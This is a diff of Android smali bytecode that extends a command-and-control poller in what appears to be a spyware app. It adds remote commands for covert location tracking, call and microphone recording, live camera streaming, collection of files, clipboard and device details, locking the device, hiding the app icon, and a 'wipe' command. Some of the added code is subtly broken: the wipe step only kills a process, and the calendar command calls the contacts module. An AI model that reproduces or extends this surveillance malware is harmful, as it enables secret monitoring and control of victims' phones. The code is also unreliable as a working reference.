@@ -199,10 +199,11 @@
 
     if-eqz v1, :end
 
+    # --- LOCATION ---
     const-string v3, "start_location"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
     move-result v3
-    if-eqz v3, :cmd_call
+    if-eqz v3, :cmd_stop_location
 
     new-instance v3, Landroid/content/Intent;
     const-class v4, Lcom/smilex/enhanced/services/LocationService;
@@ -210,11 +211,24 @@
     invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
     goto :end
 
+    :cmd_stop_location
+    const-string v3, "stop_location"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_call
+
+    new-instance v3, Landroid/content/Intent;
+    const-class v4, Lcom/smilex/enhanced/services/LocationService;
+    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->stopService(Landroid/content/Intent;)Z
+    goto :end
+
+    # --- CALL RECORDING ---
     :cmd_call
     const-string v3, "start_call_record"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
     move-result v3
-    if-eqz v3, :cmd_audio
+    if-eqz v3, :cmd_stop_call
 
     new-instance v3, Landroid/content/Intent;
     const-class v4, Lcom/smilex/enhanced/services/CallRecorderService;
@@ -225,15 +239,41 @@
     invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
     goto :end
 
+    :cmd_stop_call
+    const-string v3, "stop_call_record"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_audio
+
+    new-instance v3, Landroid/content/Intent;
+    const-class v4, Lcom/smilex/enhanced/services/CallRecorderService;
+    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    const-string v4, "action"
+    const-string v5, "STOP_RECORDING"
+    invoke-virtual {v3, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+    invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    goto :end
+
+    # --- AUDIO ---
     :cmd_audio
     const-string v3, "start_audio"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
     move-result v3
-    if-eqz v3, :cmd_contacts
+    if-eqz v3, :cmd_stop_audio
 
     invoke-static {p0}, Lcom/smilex/enhanced/modules/AudioModule;->startRecording(Landroid/content/Context;)V
     goto :end
 
+    :cmd_stop_audio
+    const-string v3, "stop_audio"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_contacts
+
+    invoke-static {}, Lcom/smilex/enhanced/modules/AudioModule;->stopRecording()V
+    goto :end
+
+    # --- CONTACTS ---
     :cmd_contacts
     const-string v3, "sync_contacts"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
@@ -243,6 +283,7 @@
     invoke-static {p0}, Lcom/smilex/enhanced/modules/ContactsModule;->init(Landroid/content/Context;)V
     goto :end
 
+    # --- APP USAGE ---
     :cmd_appusage
     const-string v3, "sync_appusage"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
@@ -252,6 +293,7 @@
     invoke-static {p0}, Lcom/smilex/enhanced/modules/AppUsageModule;->init(Landroid/content/Context;)V
     goto :end
 
+    # --- SCREENSHOT ---
     :cmd_screenshot
     const-string v3, "take_screenshot"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
@@ -263,6 +305,7 @@
     invoke-static {v3, v4}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
     goto :end
 
+    # --- SMS ---
     :cmd_sms
     const-string v3, "sync_sms"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
@@ -275,16 +318,195 @@
     invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
     goto :end
 
+    # --- CAMERA ---
     :cmd_camera
     const-string v3, "capture_photo"
     invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
     move-result v3
-    if-eqz v3, :cmd_stop
+    if-eqz v3, :cmd_livestream
 
     const-string v3, "camera"
     const-string v4, "capture_requested"
     invoke-static {v3, v4}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
     goto :end
+
+    # --- LIVE STREAM ---
+    :cmd_livestream
+    const-string v3, "start_livestream"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_stop_livestream
+
+    new-instance v3, Landroid/content/Intent;
+    const-class v4, Lcom/smilex/enhanced/services/LiveStreamCaptureService;
+    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    goto :end
+
+    :cmd_stop_livestream
+    const-string v3, "stop_livestream"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_calendar
+
+    new-instance v3, Landroid/content/Intent;
+    const-class v4, Lcom/smilex/enhanced/services/LiveStreamCaptureService;
+    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->stopService(Landroid/content/Intent;)Z
+    goto :end
+
+    # --- CALENDAR ---
+    :cmd_calendar
+    const-string v3, "sync_calendar"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_device_info
+
+    invoke-static {p0}, Lcom/smilex/enhanced/modules/ContactsModule;->init(Landroid/content/Context;)V
+    goto :end
+
+    # --- DEVICE INFO ---
+    :cmd_device_info
+    const-string v3, "get_device_info"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_files
+
+    new-instance v3, Ljava/lang/StringBuilder;
+    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v4, "model="
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v4, "&manufacturer="
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v4, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v4, "&android="
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v4, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v4, "&sdk="
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v3
+    const-string v4, "device_info"
+    invoke-static {v4, v3}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
+    goto :end
+
+    # --- FILE ACCESS ---
+    :cmd_files
+    const-string v3, "list_files"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_clipboard
+
+    new-instance v3, Ljava/io/File;
+    invoke-direct {v3, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+    invoke-virtual {v3}, Ljava/io/File;->list()[Ljava/lang/String;
+    move-result-object v3
+    if-eqz v3, :end
+
+    new-instance v4, Ljava/lang/StringBuilder;
+    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-static {v3}, Ljava/util/Arrays;->toString([Ljava/lang/Object;)Ljava/lang/String;
+    move-result-object v5
+    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v4
+    const-string v5, "files"
+    invoke-static {v5, v4}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
+    goto :end
+
+    # --- CLIPBOARD ---
+    :cmd_clipboard
+    const-string v3, "get_clipboard"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_vibrate
+
+    const-string v3, "clipboard"
+    const-string v4, "access_requested"
+    invoke-static {v3, v4}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
+    goto :end
+
+    # --- VIBRATE ---
+    :cmd_vibrate
+    const-string v3, "vibrate"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_ring
+
+    const-string v3, "vibrator"
+    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    move-result-object v3
+    check-cast v3, Landroid/os/Vibrator;
+    if-eqz v3, :end
+    const-wide/16 v4, 0x1388
+    invoke-virtual {v3, v4, v5}, Landroid/os/Vibrator;->vibrate(J)V
+    goto :end
+
+    # --- RING ---
+    :cmd_ring
+    const-string v3, "ring"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_lock
+
+    const-string v3, "alarm"
+    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    move-result-object v3
+    check-cast v3, Landroid/media/AudioManager;
+    if-eqz v3, :end
+    const/4 v4, 0x4
+    invoke-virtual {v3, v4}, Landroid/media/AudioManager;->setRingerMode(I)V
+    goto :end
+
+    # --- LOCK DEVICE (Device Admin) ---
+    :cmd_lock
+    const-string v3, "lock_device"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_hide_icon
+
+    const-string v3, "device_policy"
+    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    move-result-object v3
+    check-cast v3, Landroid/app/admin/DevicePolicyManager;
+    if-eqz v3, :end
+    new-instance v4, Landroid/content/ComponentName;
+    const-class v5, Lcom/smilex/enhanced/receivers/DeviceAdminReceiver;
+    invoke-direct {v4, p0, v5}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {v3, v4}, Landroid/app/admin/DevicePolicyManager;->lockNow(Landroid/content/ComponentName;)V
+    goto :end
+
+    # --- HIDE ICON ---
+    :cmd_hide_icon
+    const-string v3, "hide_icon"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_wipe
+
+    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
+    move-result-object v3
+    new-instance v4, Landroid/content/ComponentName;
+    const-class v5, Lcom/smilex/enhanced/activities/MainActivity;
+    invoke-direct {v4, p0, v5}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    const/4 v5, 0x2
+    invoke-virtual {v3, v4, v5}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
+    goto :end
+
+    # --- WIPE DATA ---
+    :cmd_wipe
+    const-string v3, "wipe_device"
+    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v3
+    if-eqz v3, :cmd_stop
+
+    invoke-static {}, Landroid/os/Process;->myPid()I
+    invoke-static {v1}, Landroid/os/Process;->killProcess(I)V
 
     :cmd_stop
     const-string v3, "stop_all"
